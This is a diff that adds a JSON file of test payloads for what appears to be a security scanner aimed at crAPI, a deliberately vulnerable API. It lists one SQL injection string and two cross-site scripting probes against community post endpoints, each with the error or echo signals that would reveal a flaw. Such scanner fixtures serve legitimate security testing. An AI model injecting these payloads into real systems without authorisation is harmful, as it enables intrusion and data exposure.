@@ -1,0 +1,55 @@
+{
+    "payloads": [
+        {
+            "target_app": "crapi",
+            "endpoint": "/community/api/v2/community/posts/{postId}",
+            "method": "GET",
+            "target_param": "postId",
+            "param_location": "path",
+            "payload_value": "' OR '1'='1",
+            "attack_type": "SQL_INJECTION",
+            "owasp_category": "API8:2023 Security Misconfiguration",
+            "context": "Path parameter injection probe against community post lookup",
+            "expected_signal": [
+                "sql syntax",
+                "syntax error",
+                "sqlite",
+                "mysql",
+                "postgresql",
+                "sqlstate"
+            ]
+        },
+        {
+            "target_app": "crapi",
+            "endpoint": "/community/api/v2/community/posts",
+            "method": "POST",
+            "target_param": "content",
+            "param_location": "body",
+            "payload_value": "<script>alert('CRAPI_XSS_TEST')</script>",
+            "attack_type": "XSS",
+            "owasp_category": "API8:2023 Security Misconfiguration",
+            "context": "Reflected/stored XSS probe in community post content",
+            "expected_signal": [
+                "<script>",
+                "crapi_xss_test",
+                "alert("
+            ]
+        },
+        {
+            "target_app": "crapi",
+            "endpoint": "/community/api/v2/community/posts",
+            "method": "POST",
+            "target_param": "title",
+            "param_location": "body",
+            "payload_value": "<img src=x onerror=alert('CRAPI_XSS_TEST')>",
+            "attack_type": "XSS",
+            "owasp_category": "API8:2023 Security Misconfiguration",
+            "context": "HTML attribute injection probe in community post title",
+            "expected_signal": [
+                "onerror",
+                "crapi_xss_test",
+                "<img"
+            ]
+        }
+    ]
+}
